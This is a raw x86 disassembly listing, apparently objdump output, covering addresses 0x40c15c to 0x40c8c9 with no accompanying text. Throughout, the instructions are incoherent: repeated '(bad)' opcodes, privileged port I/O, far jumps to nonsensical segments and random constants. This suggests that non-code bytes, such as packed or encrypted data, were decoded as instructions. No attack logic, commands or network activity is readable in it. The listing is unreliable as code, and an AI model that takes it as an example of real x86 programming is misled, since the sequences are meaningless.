  40c15c:	shr    DWORD PTR [ecx],1
  40c15e:	adc    al,0x3
  40c160:	dec    eax
  40c161:	push   ds
  40c162:	imul   edi,DWORD PTR [ecx],0x1c
  40c165:	(bad)  
  40c166:	mov    ch,0x45
  40c168:	pop    ds
  40c169:	daa    
  40c16a:	push   0x3c
  40c16c:	dec    esi
  40c16d:	push   ebx
  40c16e:	and    bl,bh
  40c170:	dec    dl
  40c172:	lock cmp bh,BYTE PTR [ecx-0x61820c13]
  40c179:	out    dx,eax
  40c17a:	mov    cl,0x67
  40c17c:	jmp    0x40c1d8
  40c17e:	shl    BYTE PTR [edx+ebx*8],cl
  40c181:	or     BYTE PTR [bp+di],ah
  40c184:	into   
  40c185:	or     BYTE PTR [edx-0xf3bd0c6],ch
  40c18b:	push   cs
  40c18c:	cmp    eax,0xf379c5ab
  40c191:	sbb    eax,0x5a5cd616
  40c196:	sub    BYTE PTR [edi-0x79d2b255],cl
  40c19c:	push   esi
  40c19d:	mov    ecx,0x9c11140d
  40c1a2:	popa   
  40c1a3:	ins    DWORD PTR es:[edi],dx
  40c1a4:	sub    eax,DWORD PTR [ebp+0x46]
  40c1a7:	inc    ebp
  40c1a8:	mov    esi,0xdc82ce05
  40c1ad:	pop    ebx
  40c1ae:	out    dx,al
  40c1af:	and    eax,0xf8846efd
  40c1b4:	dec    eax
  40c1b5:	mov    edi,0x7e39e82c
  40c1ba:	in     eax,dx
  40c1bb:	push   ebx
  40c1bc:	jl     0x40c142
  40c1be:	ret    
  40c1bf:	add    bh,BYTE PTR ds:0xcc9ea5ff
  40c1c5:	imul   ecx,DWORD PTR [edx],0xc1e9d103
  40c1cb:	or     al,BYTE PTR [eax]
  40c1cd:	add    cl,ch
  40c1cf:	outs   dx,BYTE PTR ds:[esi]
  40c1d0:	add    eax,DWORD PTR [eax]
  40c1d2:	add    BYTE PTR [esi],dl
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	scas   eax,DWORD PTR es:[edi]
  40c1e0:	fcom   DWORD PTR [esi+eiz*4+0x7c7c8839]
  40c1e7:	retf   0x7c79
  40c1ea:	jl     0x40c24e
  40c1ec:	and    ah,bl
  40c1ee:	mov    al,ds:0x35e7a671
  40c1f3:	aaa    
  40c1f4:	jg     0x40c1f6
  40c1f6:	xor    eax,0x141d1a6
  40c1fb:	(bad)  
  40c1fc:	mov    esp,DWORD PTR [ebx-0x175042c3]
  40c202:	mov    esp,0x872e9fe1
  40c207:	push   ecx
  40c208:	fdiv   st(3),st
  40c20a:	dec    edx
  40c20b:	jmp    0x40c26f
  40c20d:	in     al,0x6f
  40c20f:	fwait
  40c210:	shr    DWORD PTR [edx+0x4d],cl
  40c213:	loope  0x40c206
  40c215:	push   0x8b84e682
  40c21a:	inc    esi
  40c21b:	add    BYTE PTR [edi-0x4b],dl
  40c21e:	adc    dl,BYTE PTR [esi-0x23]
  40c221:	pop    ebx
  40c222:	mov    eax,0xa2d87264
  40c227:	test   al,0x29
  40c229:	mov    ds:0xd81305,al
  40c22e:	mov    dl,cl
  40c230:	(bad)  
  40c232:	xchg   BYTE PTR [ebx+0xd555d0a],al
  40c238:	js     0x40c1cf
  40c23a:	popf   
  40c23b:	mov    al,ds:0x58d1e83e
  40c240:	std    
  40c241:	and    edx,ebp
  40c243:	(bad)  
  40c244:	(bad)  
  40c246:	inc    esp
  40c247:	dec    esp
  40c248:	mov    ds:0x733664d3,eax
  40c24d:	es jae 0x40c286
  40c250:	sbb    BYTE PTR [ebp-0x6bbd3f4d],ch
  40c256:	shr    bh,cl
  40c258:	sbb    al,0x73
  40c25a:	(bad)  
  40c25b:	lods   eax,DWORD PTR ds:[esi]
  40c25c:	mov    dl,0x10
  40c25e:	nop
  40c25f:	inc    esi
  40c260:	cs pop ebx
  40c262:	jmp    0x9e10817a
  40c267:	mov    edx,0x5d572c58
  40c26c:	and    ebx,ecx
  40c26e:	arpl   si,cx
  40c270:	push   ss
  40c271:	mov    DWORD PTR [edx],ebx
  40c273:	rcr    DWORD PTR [ebx-0x5f],cl
  40c276:	mov    esp,0x52b3c614
  40c27b:	mov    al,ds:0x9f853f66
  40c280:	add    BYTE PTR [esi+eiz*2],bh
  40c283:	pop    edx
  40c284:	mov    cl,0x94
  40c286:	jb     0x40c255
  40c288:	xlat   BYTE PTR ds:[ebx]
  40c289:	xchg   ecx,eax
  40c28a:	stos   BYTE PTR es:[edi],al
  40c28b:	sbb    ebx,esi
  40c28d:	lahf   
  40c28e:	vpmaddwd ymm4,ymm0,ymm5
  40c292:	aad    0x2
  40c294:	dec    ebx
  40c295:	sbb    bh,BYTE PTR [ecx+0x6c0e3350]
  40c29b:	mov    esp,0x8295ad34
  40c2a0:	mov    ecx,0x8ff49a15
  40c2a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a6:	xchg   ebp,eax
  40c2a7:	aas    
  40c2a8:	xchg   ebp,eax
  40c2a9:	add    dl,BYTE PTR [ebx+0xd363049]
  40c2af:	pop    ecx
  40c2b0:	jnp    0x40c248
  40c2b2:	push   cs
  40c2b3:	shl    DWORD PTR ds:0x6400309a,cl
  40c2b9:	cmc    
  40c2ba:	fs (bad) 
  40c2bc:	jae    0x40c316
  40c2be:	mov    eax,ds:0x8d0c197e
  40c2c3:	push   esp
  40c2c4:	lock cmp esp,esi
  40c2c7:	dec    ebp
  40c2c8:	cdq    
  40c2c9:	push   ds
  40c2ca:	cmp    edx,DWORD PTR [esi]
  40c2cc:	scas   eax,DWORD PTR es:[edi]
  40c2cd:	push   es
  40c2ce:	(bad)  
  40c2d0:	ss test al,0x2a
  40c2d3:	sub    esi,edx
  40c2d5:	xlat   BYTE PTR ds:[ebx]
  40c2d6:	push   cs
  40c2d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2d8:	leave  
  40c2d9:	xor    bl,BYTE PTR [edi]
  40c2db:	xor    ch,bl
  40c2dd:	mov    ebp,0xdc8d743c
  40c2e2:	ins    BYTE PTR es:[edi],dx
  40c2e3:	data16 mov BYTE PTR [ebx],dl
  40c2e6:	mov    eax,DWORD PTR [eax-0x2707bbf3]
  40c2ec:	stos   DWORD PTR es:[edi],eax
  40c2ed:	jno    0x40c2dd
  40c2ef:	cld    
  40c2f0:	dec    esi
  40c2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f2:	and    al,0x30
  40c2f4:	add    eax,0x84f0477d
  40c2f9:	mov    al,0x39
  40c2fb:	(bad)  
  40c2fc:	lods   al,BYTE PTR ds:[esi]
  40c2fd:	jns    0x40c322
  40c2ff:	scas   al,BYTE PTR es:[edi]
  40c300:	stos   DWORD PTR es:[edi],eax
  40c301:	jge    0x40c346
  40c303:	aad    0x9e
  40c305:	or     BYTE PTR [edx+0x5a3202a8],dl
  40c30b:	pusha  
  40c30c:	out    0x15,eax
  40c30e:	sub    dh,al
  40c310:	les    eax,FWORD PTR [eax-0xdc74f3c]
  40c316:	mov    al,ds:0xba8ba6c6
  40c31b:	xchg   ebx,eax
  40c31c:	rol    ch,1
  40c31e:	xor    al,0x5
  40c320:	fs pushf 
  40c322:	push   ds
  40c323:	scas   eax,DWORD PTR es:[edi]
  40c324:	out    0x4b,al
  40c326:	add    DWORD PTR [edx],ebp
  40c328:	out    0xe2,eax
  40c32a:	ss sbb bl,bh
  40c32d:	fdiv   DWORD PTR [edi]
  40c32f:	mov    dl,0x39
  40c331:	or     edi,DWORD PTR [esi+0x5f5d579]
  40c337:	xor    DWORD PTR [edi],ebp
  40c339:	jb     0x40c3aa
  40c33b:	jle    0x40c348
  40c33d:	je     0x40c2d1
  40c33f:	or     bh,BYTE PTR [edi]
  40c341:	fisttp QWORD PTR [edi]
  40c343:	bound  eax,QWORD PTR [esi+0x7]
  40c346:	jg     0x40c302
  40c348:	adc    DWORD PTR [eax],ecx
  40c34a:	jb     0x40c305
  40c34c:	add    eax,0x36404809
  40c351:	push   0xffffffa0
  40c353:	or     al,0x82
  40c355:	pop    ecx
  40c356:	sahf   
  40c357:	pop    es
  40c358:	mov    al,ds:0x45ebbbf2
  40c35d:	cmp    esi,DWORD PTR [ecx-0xc]
  40c360:	(bad)  
  40c361:	hlt    
  40c362:	jne    0x40c355
  40c364:	sbb    DWORD PTR [ecx-0x5541042f],esi
  40c36a:	(bad)  
  40c36c:	xchg   edi,eax
  40c36d:	push   cs
  40c36e:	dec    edx
  40c36f:	fistp  DWORD PTR [ebp+0x6]
  40c372:	scas   al,BYTE PTR es:[edi]
  40c373:	sar    BYTE PTR [ecx],cl
  40c375:	or     eax,DWORD PTR [edi-0x3b]
  40c378:	jb     0x40c3f2
  40c37a:	outs   dx,BYTE PTR ds:[esi]
  40c37b:	pop    ds
  40c37c:	lea    esi,[edi+0x3e]
  40c37f:	add    al,0xe9
  40c381:	dec    esp
  40c382:	les    ecx,FWORD PTR [ecx]
  40c384:	mov    bh,0x7b
  40c386:	push   ds
  40c387:	js     0x40c366
  40c389:	arpl   WORD PTR [ebx-0x43],sp
  40c38c:	pop    edi
  40c38d:	adc    cl,BYTE PTR [eax]
  40c38f:	bnd jmp 0x270b5653
  40c395:	(bad)  [ebx+edi*1-0x4e]
  40c399:	out    0x28,al
  40c39b:	jo     0x40c355
  40c39d:	retf   
  40c39e:	sti    
  40c39f:	or     al,0x9d
  40c3a1:	(bad)  
  40c3a2:	fsub   DWORD PTR [eax]
  40c3a4:	jae    0x40c3a3
  40c3a6:	lods   eax,DWORD PTR ds:[esi]
  40c3a7:	sub    al,0xbf
  40c3a9:	inc    edx
  40c3aa:	aam    0x1c
  40c3ac:	ss dec edi
  40c3ae:	lahf   
  40c3af:	add    al,0xb4
  40c3b1:	retf   
  40c3b2:	dec    esp
  40c3b3:	dec    ebx
  40c3b4:	jg     0x40c343
  40c3b6:	icebp  
  40c3b7:	and    eax,0x3e303f1b
  40c3bc:	mov    ah,0x4a
  40c3be:	xor    al,0xd4
  40c3c0:	cmp    eax,0x2c3ca47b
  40c3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3c7:	lock mov ch,0xdf
  40c3ca:	pop    eax
  40c3cb:	sbb    al,0x82
  40c3cd:	ins    BYTE PTR es:[edi],dx
  40c3ce:	jle    0x40c3ee
  40c3d0:	test   eax,0x571621d4
  40c3d5:	mov    esp,0xc5ea4809
  40c3da:	push   ebx
  40c3db:	mov    ah,BYTE PTR [edx-0x6f]
  40c3de:	mov    ch,0x73
  40c3e0:	jecxz  0x40c432
  40c3e2:	add    eax,0x2d5a29c6
  40c3e7:	test   BYTE PTR [ebp+0x4908beb8],cl
  40c3ed:	cvttps2pi mm6,xmm0
  40c3f0:	std    
  40c3f1:	jb     0x40c3cd
  40c3f3:	call   0x882a89bb
  40c3f8:	aaa    
  40c3f9:	mov    eax,esp
  40c3fb:	lds    edi,FWORD PTR [esi-0x56605234]
  40c401:	js     0x40c39e
  40c403:	jg     0x40c3f7
  40c405:	in     al,0xd6
  40c407:	cld    
  40c408:	jo     0x40c3fe
  40c40a:	jae    0x40c435
  40c40c:	loopne 0x40c473
  40c40e:	push   ds
  40c40f:	jno    0x40c3cb
  40c411:	adc    al,0x7e
  40c413:	ja     0x40c3f5
  40c415:	sub    esp,DWORD PTR ds:0x51dd62b6
  40c41b:	hlt    
  40c41c:	add    al,0x56
  40c41e:	sti    
  40c41f:	jns    0x40c3bf
  40c421:	add    bh,BYTE PTR [esi-0x40]
  40c424:	popf   
  40c425:	mov    bh,0x99
  40c427:	adc    eax,0x23657fc9
  40c42c:	sub    DWORD PTR [ebx-0x5ad6d350],ebp
  40c432:	outs   dx,BYTE PTR ds:[esi]
  40c433:	outs   dx,BYTE PTR ds:[esi]
  40c434:	pop    esi
  40c435:	or     eax,0xa07f3be9
  40c43a:	mov    esi,0x11fd955d
  40c43f:	adc    eax,0x62308006
  40c444:	jmp    0x40c472
  40c446:	bsr    eax,DWORD PTR [edi]
  40c449:	jnp    0x40c3ea
  40c44b:	jmp    0xee04:0xb2ddae9c
  40c452:	push   edx
  40c453:	jmp    0x40c424
  40c455:	pushf  
  40c456:	push   ss
  40c457:	jle    0x40c499
  40c459:	lahf   
  40c45a:	adc    DWORD PTR [edx+0x2c],eax
  40c45d:	rol    al,cl
  40c45f:	stc    
  40c460:	adc    eax,0xbddb930b
  40c465:	add    eax,0x9f72fda7
  40c46a:	add    BYTE PTR [edx+edi*2+0x44d87e24],ah
  40c471:	cs ror edx,0x3e
  40c475:	daa    
  40c476:	ret    
  40c477:	rcl    ebp,0x58
  40c47a:	ja     0x40c434
  40c47c:	jno    0x40c457
  40c47e:	ror    BYTE PTR ds:0xf45bab2b,cl
  40c484:	mov    cl,0x3e
  40c486:	in     eax,0xfa
  40c488:	ficomp DWORD PTR [ecx-0x67]
  40c48b:	jnp    0x40c429
  40c48d:	ss mov ss,ebx
  40c490:	cli    
  40c491:	out    dx,eax
  40c492:	enter  0x7204,0xbf
  40c496:	ror    DWORD PTR [ebx-0x7f],cl
  40c499:	in     al,dx
  40c49a:	je     0x40c434
  40c49c:	adc    BYTE PTR [eax+0x62f103a4],bh
  40c4a2:	sti    
  40c4a3:	shl    DWORD PTR [eax],cl
  40c4a5:	or     eax,0x6a41fb93
  40c4aa:	ds inc edi
  40c4ac:	lahf   
  40c4ad:	(bad)  
  40c4ae:	call   0x398c:0xb8e7627
  40c4b5:	mov    bl,0x54
  40c4b7:	mov    edx,0xc833a4da
  40c4bc:	daa    
  40c4bd:	cdq    
  40c4be:	lea    edx,cs:[ebp-0x5feff0a0]
  40c4c5:	mov    dh,0x26
  40c4c7:	push   es
  40c4c8:	push   0xfd2d0c04
  40c4cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ce:	nop
  40c4cf:	or     DWORD PTR [edx],0xffffffe4
  40c4d2:	inc    esi
  40c4d3:	xor    ch,ch
  40c4d5:	aad    0x4f
  40c4d7:	mov    bh,0xda
  40c4d9:	mov    al,0xcc
  40c4db:	in     al,dx
  40c4dc:	out    0xc9,eax
  40c4de:	scas   al,BYTE PTR es:[edi]
  40c4df:	sbb    DWORD PTR [ecx-0x9be5e4c],ebp
  40c4e5:	data16 mov bh,0xb9
  40c4e8:	outs   dx,DWORD PTR ds:[esi]
  40c4e9:	bnd jl 0x40c4d2
  40c4ec:	jmp    0xce8:0x50b4ad72
  40c4f3:	shl    DWORD PTR [esp+ebp*4],cl
  40c4f6:	pop    ecx
  40c4f7:	inc    ecx
  40c4f8:	sub    eax,0xe7ec5ce2
  40c4fd:	repz test DWORD PTR [edx+0x33],0x17eff3fd
  40c505:	lea    ebx,[esi-0x32fec4a8]
  40c50b:	addr16 pop es
  40c50d:	in     al,dx
  40c50e:	push   ebx
  40c50f:	xchg   edi,eax
  40c510:	pop    esi
  40c511:	xchg   ecx,eax
  40c512:	cmp    eax,0x50f854f2
  40c517:	mov    ch,0xd2
  40c519:	mov    edx,0xe70aed6d
  40c51e:	mov    bl,0x72
  40c520:	jno    0x40c586
  40c522:	leave  
  40c523:	cmc    
  40c524:	aam    0xd6
  40c526:	push   edi
  40c527:	dec    edi
  40c528:	mov    al,ds:0x3b3013c6
  40c52d:	fcompp 
  40c52f:	std    
  40c530:	inc    ebp
  40c531:	pop    eax
  40c532:	in     eax,dx
  40c533:	inc    eax
  40c534:	push   esi
  40c535:	in     eax,0xd0
  40c537:	repnz lea edx,[ebp+0x20]
  40c53b:	fiadd  WORD PTR [eax]
  40c53d:	xor    eax,0x8bfc3182
  40c542:	push   ebp
  40c543:	call   0x5544957b
  40c548:	in     al,dx
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0xce69733d,si
  40c55e:	call   0x95d8b0b5
  40c563:	jl     0x40c5e1
  40c565:	retf   0x7c79
  40c568:	jl     0x40c55b
  40c56a:	sbb    DWORD PTR [ebp+0xa],esi
  40c56d:	outs   dx,DWORD PTR ds:[esi]
  40c56e:	or     eax,0xeca3de2e
  40c573:	sbb    cl,bh
  40c575:	cs mov edi,0x326b65de
  40c57b:	adc    al,0x15
  40c57d:	mov    esi,0xb0d7b418
  40c582:	xor    dh,dl
  40c584:	xchg   ebx,eax
  40c585:	pop    edi
  40c586:	int3   
  40c587:	std    
  40c588:	enter  0x6849,0x47
  40c58c:	popf   
  40c58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c58e:	lock mov dl,0xe2
  40c591:	jg     0x40c582
  40c593:	sub    bl,bh
  40c595:	pop    ecx
  40c596:	sbb    al,BYTE PTR [esi]
  40c598:	jb     0x40c567
  40c59a:	pop    eax
  40c59b:	sahf   
  40c59c:	enter  0x55d3,0x9c
  40c5a0:	sub    dl,BYTE PTR [esi-0x1c]
  40c5a3:	les    ebx,FWORD PTR [ebp-0xb4a9c50]
  40c5a9:	xchg   DWORD PTR [ebx+0x58],ebp
  40c5ac:	repnz xchg edx,eax
  40c5ae:	loopne 0x40c574
  40c5b0:	mov    ebp,0x56d4e4f4
  40c5b5:	popf   
  40c5b6:	dec    ecx
  40c5b7:	cmp    dh,bl
  40c5b9:	out    0xce,eax
  40c5bb:	aas    
  40c5bc:	add    eax,0xbf5d62c6
  40c5c1:	mov    cl,dl
  40c5c3:	sbb    bh,bl
  40c5c5:	daa    
  40c5c6:	cmc    
  40c5c7:	xlat   BYTE PTR ds:[ebx]
  40c5c8:	repz mov eax,ds:0x8832bd07
  40c5ce:	mov    eax,0xf01f4f
  40c5d3:	cmp    ebx,ebp
  40c5d5:	xchg   ecx,eax
  40c5d6:	inc    edx
  40c5d7:	jne    0x40c587
  40c5d9:	xchg   esi,eax
  40c5da:	pop    ss
  40c5db:	or     dh,dh
  40c5dd:	lds    ecx,FWORD PTR [ebp-0x5da9dd12]
  40c5e3:	test   eax,0x3fb474b
  40c5e8:	push   0x53
  40c5ea:	mov    eax,0x7777e666
  40c5ef:	cdq    
  40c5f0:	sbb    DWORD PTR [ebx-0x29],eax
  40c5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5f4:	fistp  DWORD PTR [edx-0x1f]
  40c5f7:	ret    
  40c5f8:	into   
  40c5f9:	xchg   BYTE PTR [edx],ch
  40c5fb:	aam    0x16
  40c5fd:	mov    eax,0x5478bb29
  40c602:	cmp    bl,al
  40c604:	into   
  40c605:	stos   BYTE PTR es:[edi],al
  40c606:	pop    esp
  40c607:	es pop esi
  40c609:	rcr    BYTE PTR [ebx],cl
  40c60b:	adc    DWORD PTR [ebx+0x719f90ba],edi
  40c611:	sbb    eax,0x97235fe6
  40c616:	jg     0x40c59f
  40c618:	push   0x21c5d0ef
  40c61d:	and    al,0x4e
  40c61f:	mov    edx,0xceb0edc8
  40c624:	mov    dl,0xf
  40c626:	xor    edi,esi
  40c628:	adc    ebp,DWORD PTR [esp+eax*1]
  40c62b:	lahf   
  40c62c:	fidiv  WORD PTR [ebp-0x5ec9de38]
  40c632:	jl     0x40c6a8
  40c634:	inc    edx
  40c635:	add    BYTE PTR [ebp-0x12],cl
  40c638:	jnp    0x40c6b7
  40c63a:	pop    ebp
  40c63b:	and    esi,DWORD PTR [edx+0xd]
  40c63e:	test   DWORD PTR [edi-0x63],eax
  40c641:	cmp    DWORD PTR [ebp-0x22b0f3d3],esp
  40c647:	mov    DWORD PTR [edx+0x1f68ae5a],0x90e40bb7
  40c651:	ror    DWORD PTR [edi-0x80],0xda
  40c655:	xor    eax,0xb66d4e79
  40c65a:	mov    ds:0xf398a685,al
  40c65f:	xchg   ebp,eax
  40c660:	js     0x40c690
  40c662:	or     bl,BYTE PTR [ebx+0x68]
  40c665:	ret    
  40c666:	ins    DWORD PTR es:[edi],dx
  40c667:	and    al,0x42
  40c669:	adc    bh,bh
  40c66b:	fcom   QWORD PTR [ecx+edi*8]
  40c66e:	rcr    DWORD PTR ds:0x8e791960,cl
  40c674:	popa   
  40c675:	sbb    DWORD PTR [ecx+edx*8-0x4b93ec5e],ebp
  40c67c:	mov    ebx,0xe8d87a18
  40c681:	or     BYTE PTR [esi+ebp*8+0x13],ch
  40c685:	fwait
  40c686:	loope  0x40c6fe
  40c688:	pop    eax
  40c689:	adc    eax,0xe774385f
  40c68e:	mov    ds:0x7a4d699b,al
  40c693:	jmp    0x40c6c3
  40c695:	js     0x40c713
  40c697:	xchg   edx,eax
  40c698:	mov    ch,0x11
  40c69a:	xchg   ebx,eax
  40c69b:	jne    0x40c6a4
  40c69d:	fwait
  40c69e:	mov    esi,?
  40c6a0:	leave  
  40c6a1:	setne  BYTE PTR [ecx]
  40c6a4:	jmp    0x6148:0xe00117b9
  40c6ab:	(bad)  
  40c6ac:	jmp    0x3e28:0x27be188e
  40c6b3:	jle    0x40c6c5
  40c6b5:	fimul  WORD PTR [ebx-0x42baffa3]
  40c6bb:	fs std 
  40c6bd:	push   ds
  40c6be:	(bad)  
  40c6bf:	arpl   WORD PTR [ebp+0x18ef9573],cx
  40c6c5:	push   eax
  40c6c6:	jmp    0xf141:0x11eb4a81
  40c6cd:	jecxz  0x40c68e
  40c6cf:	pop    ebp
  40c6d0:	scas   eax,DWORD PTR es:[edi]
  40c6d1:	sub    esp,ecx
  40c6d3:	loope  0x40c659
  40c6d5:	xchg   DWORD PTR [ebp-0x63],edx
  40c6d8:	jp     0x40c72e
  40c6da:	mov    cl,0x9d
  40c6dc:	pushf  
  40c6dd:	rol    BYTE PTR [ebx+0x26],1
  40c6e0:	or     al,0x2d
  40c6e2:	jo     0x40c699
  40c6e4:	aam    0xbe
  40c6e6:	data16 jge 0x40c708
  40c6e9:	fs mov esp,0x8c0d334a
  40c6ef:	mov    fs,WORD PTR [ebx+eax*2]
  40c6f2:	ret    0x5e1b
  40c6f5:	mov    esp,0x4a814dfb
  40c6fa:	adc    ebx,DWORD PTR [esi+0x5df9aa1c]
  40c700:	aaa    
  40c701:	mov    edx,0x93c12a24
  40c706:	call   0x6012b2f8
  40c70b:	or     edi,DWORD PTR [ecx-0xe19ca30]
  40c711:	sub    ecx,ebx
  40c713:	sbb    BYTE PTR [eax-0x616e21cf],0xcb
  40c71a:	es pop eax
  40c71c:	xchg   DWORD PTR [esi],ebx
  40c71e:	test   al,0x22
  40c720:	jnp    0x40c6fc
  40c722:	jl     0x40c6bd
  40c724:	add    DWORD PTR [esi+0xe],ebp
  40c727:	mov    ebx,0x33402afd
  40c72c:	shl    bh,0xf3
  40c72f:	adc    ah,BYTE PTR [ebp+0x20]
  40c732:	push   esi
  40c733:	fcmovnu st,st(7)
  40c735:	push   0x155d40e1
  40c73a:	test   BYTE PTR [ebx+ecx*2+0xb],dl
  40c73e:	stos   DWORD PTR es:[edi],eax
  40c73f:	pop    ss
  40c740:	test   eax,0x4dd3a89b
  40c745:	lock nop
  40c747:	aam    0x44
  40c749:	mov    bh,bl
  40c74b:	mov    ch,BYTE PTR [edi-0x6e]
  40c74e:	fcomp  QWORD PTR [edx+0x7445669c]
  40c754:	neg    DWORD PTR [edx]
  40c756:	aad    0xf
  40c758:	int3   
  40c759:	jbe    0x40c737
  40c75b:	aam    0xba
  40c75d:	leave  
  40c75e:	mov    ch,0xa2
  40c760:	lahf   
  40c761:	ds (bad) 
  40c763:	retf   0xa595
  40c766:	mov    cl,0xa2
  40c768:	cmp    al,0xe7
  40c76a:	jmp    0x8bece1d8
  40c76f:	push   ds
  40c770:	mov    al,0x4b
  40c772:	dec    ebp
  40c773:	push   edx
  40c774:	xchg   edx,eax
  40c775:	inc    ecx
  40c776:	into   
  40c777:	ins    DWORD PTR es:[edi],dx
  40c778:	inc    esi
  40c779:	cld    
  40c77a:	bound  esp,QWORD PTR [ecx-0x34]
  40c77d:	push   es
  40c77e:	dec    esi
  40c77f:	stos   BYTE PTR es:[edi],al
  40c780:	lock mov ah,0xe6
  40c783:	leave  
  40c784:	inc    ebp
  40c785:	mov    eax,0xdeba2d2
  40c78a:	imul   ecx,DWORD PTR [ebx+0x464ef265],0x18
  40c791:	cmp    cl,al
  40c793:	nop
  40c794:	mov    bh,0x29
  40c796:	fimul  WORD PTR [ebp-0x3a708014]
  40c79c:	arpl   WORD PTR [esi],di
  40c79e:	fdiv   QWORD PTR [esi+ebp*4]
  40c7a1:	sub    dh,bh
  40c7a3:	adc    DWORD PTR [ebx+0x70],esp
  40c7a6:	jmp    0x40c72d
  40c7a8:	loop   0x40c7cf
  40c7aa:	sbb    DWORD PTR [ebx+0x4d],edi
  40c7ad:	sbb    eax,esi
  40c7af:	and    esp,DWORD PTR [esi+0x4fb5a048]
  40c7b5:	mov    ds:0x2dee930a,al
  40c7ba:	push   cs
  40c7bb:	call   0xaa7a1aed
  40c7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7c1:	xor    bh,BYTE PTR [ecx+ebx*2+0x66]
  40c7c5:	dec    edi
  40c7c6:	and    edi,ecx
  40c7c8:	std    
  40c7c9:	and    al,0x4a
  40c7cb:	lods   al,BYTE PTR ds:[esi]
  40c7cc:	jp     0x40c82b
  40c7ce:	(bad)  
  40c7cf:	(bad)
  40c7d2:	in     al,0x71
  40c7d4:	add    dl,ah
  40c7d6:	(bad)  
  40c7d7:	repnz cwde 
  40c7d9:	outs   dx,DWORD PTR ds:[esi]
  40c7da:	dec    esp
  40c7db:	cs jo  0x40c7ee
  40c7de:	xchg   edx,eax
  40c7df:	mov    ebx,0x5bf7b71
  40c7e4:	jl     0x40c7c7
  40c7e6:	inc    esi
  40c7e7:	nop    DWORD PTR [eax+0x6c84cf59]
  40c7ee:	sub    ah,BYTE PTR [ebx+0x56d14f64]
  40c7f4:	in     al,dx
  40c7f5:	mov    esp,ds
  40c7f7:	popa   
  40c7f8:	leave  
  40c7f9:	stos   BYTE PTR es:[edi],al
  40c7fa:	in     al,dx
  40c7fb:	cmp    ebx,DWORD PTR [ebp+ebp*4+0x64]
  40c7ff:	lds    edx,FWORD PTR [eax+0x1b785baf]
  40c805:	adc    DWORD PTR [ebx],edi
  40c807:	jne    0x40c84a
  40c809:	xchg   ebp,eax
  40c80a:	inc    ecx
  40c80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c80c:	gs mov ecx,0x9dc1e6dc
  40c812:	adc    DWORD PTR [ecx+0x230ddd7c],0x48
  40c819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c81a:	stc    
  40c81b:	(bad)  
  40c81c:	jbe    0x40c804
  40c81e:	mov    edx,0x8d49a472
  40c823:	jae    0x40c7be
  40c825:	in     al,dx
  40c826:	sar    ecx,cl
  40c828:	call   0x2313a532
  40c82d:	pushf  
  40c82e:	pusha  
  40c82f:	ficomp DWORD PTR [ebp+0x5c]
  40c832:	dec    eax
  40c833:	dec    esp
  40c834:	scas   al,BYTE PTR es:[edi]
  40c835:	imul   edx,DWORD PTR [esi],0xffffffb8
  40c838:	cli    
  40c839:	push   ebx
  40c83a:	or     eax,0xbc21286c
  40c83f:	dec    ebx
  40c840:	test   al,0xed
  40c842:	push   eax
  40c843:	pop    ebp
  40c844:	ins    BYTE PTR es:[edi],dx
  40c845:	cld    
  40c846:	pop    esp
  40c847:	arpl   WORD PTR [eax],ax
  40c849:	retf   
  40c84a:	aaa    
  40c84b:	push   edi
  40c84c:	retf   
  40c84d:	xchg   ebx,eax
  40c84e:	div    DWORD PTR [ebx]
  40c850:	sub    ebp,DWORD PTR [esi+ebp*4]
  40c853:	das    
  40c854:	xchg   BYTE PTR [eax-0x6a2d427e],bh
  40c85a:	xchg   ecx,eax
  40c85b:	inc    ecx
  40c85c:	and    DWORD PTR [eax+0x63316b28],esi
  40c862:	in     eax,0x4b
  40c864:	imul   esi,DWORD PTR [eax],0xffffffda
  40c867:	jmp    0x40c8ce
  40c869:	jbe    0x40c835
  40c86b:	int    0x16
  40c86d:	inc    edi
  40c86e:	in     al,0x90
  40c870:	adc    al,0x7a
  40c872:	push   edi
  40c873:	data16 xchg BYTE PTR [edi+0x51f56b06],dh
  40c87a:	add    ebx,DWORD PTR [di+0x16]
  40c87e:	fldcw  WORD PTR [edi-0x6]
  40c881:	mov    ah,0xd2
  40c883:	jmp    0x949f0f60
  40c888:	pushf  
  40c889:	jmp    0x40c822
  40c88b:	pop    esp
  40c88c:	mov    ds:0x14b616ad,al
  40c891:	sbb    dh,ah
  40c893:	into   
  40c894:	in     eax,0x57
  40c896:	push   esi
  40c897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c898:	(bad)  
  40c899:	not    al
  40c89b:	or     BYTE PTR [eax+0x16],bl
  40c89e:	ret    
  40c89f:	add    dh,bh
  40c8a1:	outs   dx,DWORD PTR ds:[esi]
  40c8a2:	stos   DWORD PTR es:[edi],eax
  40c8a3:	iret   
  40c8a4:	lock jns 0x40c8fd
  40c8a7:	jbe    0x40c880
  40c8a9:	mov    ah,BYTE PTR [edx]
  40c8ab:	icebp  
  40c8ac:	mov    cl,0x46
  40c8ae:	out    0xaa,al
  40c8b0:	imul   ecx,ebp,0x3173bb2d
  40c8b6:	inc    BYTE PTR ds:0x1d4d2096
  40c8bc:	aad    0xb8
  40c8be:	lahf   
  40c8bf:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8c6:	mov    BYTE PTR [ebp+0xf],dl
  40c8c9:	mov    edx,DWORD PTR [ebp-0xc]
